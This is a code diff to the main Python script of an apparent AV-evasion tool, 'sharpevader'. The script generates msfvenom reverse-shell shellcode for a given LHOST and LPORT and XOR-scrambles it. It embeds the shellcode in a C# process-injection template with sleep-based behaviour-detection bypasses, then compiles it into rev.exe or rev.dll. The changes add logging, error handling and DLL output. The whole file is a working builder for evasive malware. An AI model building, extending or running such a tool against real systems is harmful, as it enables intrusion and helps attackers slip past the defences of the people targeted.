@@ -1,13 +1,17 @@
 import os
+import yaml
 import logging
 import subprocess
-import yaml
 
+
+from helpers.log import logger
 from helpers.args import generate_cli_args
 from helpers.generate_csharp_payload import generate_csharp_payload
 
 # Shellcode Scramblers
 from shellcode_scrambler.xor_encryptor import xor_encryptor
+
+
 
 # Generate the msfvenom shellcode and put it in the /tmp/sharpevader_tmp/msf_shellcode.hex
 def generate_msfvenom_payload():
@@ -17,7 +21,13 @@ def generate_msfvenom_payload():
         subprocess.run("mkdir /tmp/sharpevader_tmp".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
     
     # Generating the msfvenom payload in the /tmp/tmp_sharpevader/ directory in hex format
-    subprocess.run(f"msfvenom -p {args.p} LHOST={args.lh} LPORT={args.lp} -f hex -o /tmp/sharpevader_tmp/msf_shellcode.hex".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    logger.debug("Generating payload with msfvenom...")
+    op = subprocess.run(f"msfvenom -p {args.p} LHOST={args.lh} LPORT={args.lp} -f hex -o /tmp/sharpevader_tmp/msf_shellcode.hex".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    if op.returncode != 0:
+        logger.error(f"msfvenom failed : \n{op.stdout.decode()}")
+        exit()
+    logger.debug(f"msfvenom command output : \n{op}")
+
 
 
 # This would read the /tmp/sharpevader_tmp/msf_shellcode.hex shellcode and convert it into an integer shellcode
@@ -29,23 +39,39 @@ def read_and_convert_shellcode():
     return integer_shellcode
 
 # Compiling the csharp code and placing it in the current working directory
-def compile_csharp_code():
-    cwd = os.getcwd()
-    subprocess.run(f"mcs -out:{cwd}/rev.exe /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+def compile_csharp_code(mode="exe",nobin=False):
+    logger.debug("Attempting to compile the C# File wth mono-mcs")
+    if nobin:
+        logger.debug("nobin flag found, The generated rev.exe or rev.dll would be placed in /tmp/sharpevader_tmp/ ")
+        cwd = "/tmp/sharpevader_tmp"
+    else:
+        cwd = os.getcwd()
+        logger.debug(f"Your rev.exe or rev.dll would be placed in {cwd}")
+    if mode == "exe":
+        
+        op = subprocess.run(f"mcs -out:{cwd}/rev.exe /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode()
+        logger.debug(f"Mono mcs logs : \n{op}")
+        logger.debug(f"Created {cwd}/rev.exe")
+    elif mode == "dll":
+        subprocess.run(f"mcs -target:library -out:{cwd}/rev.dll /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode()
+        logger.debug(f"Mono mcs logs : \n{op}")
+        logger.debug(f"Created {cwd}/rev.dll")
 
 # This is for cleaning up the temp directory created
 def cleanup():
     # Checking if the /tmp/sharpevader_tcp exists, and if it does clear all files inside it
     if os.path.isdir("/tmp/sharpevader_tmp"):
-        logging.debug("Starting cleanup process")
+        logging.debug("Found /tmp/sharpevader_tmp directory for cleanup")
+        
         # This is a bit idiotic route as for the reason wildcards do not work with subprocess
         dir_path = "/tmp/sharpevader_tmp/"
         files = os.listdir(dir_path)
         for file in files:
             file_path = os.path.join(dir_path, file)
             subprocess.run(["rm", "-f", file_path])
+        logging.debug("✅ Cleanup process complete")
     else:
-        logging.debug("Temporary directory /tmp/sharpevader_tmp/ missing, Exiting without cleanup...")
+        logger.debug("Temporary directory /tmp/sharpevader_tmp/ missing, Exiting without cleanup...")
     
 
 
@@ -53,6 +79,11 @@ def main():
     # Inserting the argparser arguments
     global args
     args = generate_cli_args()
+    logger.setLevel(logging.ERROR)
+    # Arguments check
+    if args.v:
+        logger.setLevel(logging.DEBUG)
+
 
     # Generating the msfvenom payload and placing it in the /tmp/sharpevader_tmp/msf_shellcode.hex
     generate_msfvenom_payload()
@@ -71,16 +102,22 @@ def main():
     with open(f"{script_path}/payloads/behaviour_bypass/main.yaml","r") as f:
         behaviour_bypass = yaml.load(f, Loader=yaml.SafeLoader)
 
-    # Generatinh the final csharp code with all the bypasses baked in
+    # Generating the final csharp code with all the bypasses baked in
     final_csharp_template = generate_csharp_payload(csharp_template,scrambled_shellcode,decryption_routine_cs,behaviour_bypass["behaviour_detection_bypass"]["sleep_calls"],injection_markers["injection_markers"]["process_injection.cs"])
 
     # Writing the file in the /tmp/sharpevader_tmp/magisk.cs
+    logger.debug(f"Writing the csharp file into /tmp/sharpevader_tmp/magisk.cs")
     with open("/tmp/sharpevader_tmp/magisk.cs","w") as f:
         final_csharp_code = "".join(final_csharp_template)
         f.write(final_csharp_code)
     
+    if args.dll:
+        mode = "dll"
+    else:
+        mode = "exe"
+    
     # Compiling the csharp code
-    compile_csharp_code()
+    compile_csharp_code(mode=mode,nobin=args.nobin)
 
     # Cleaning up the /tmp directory
     cleanup()
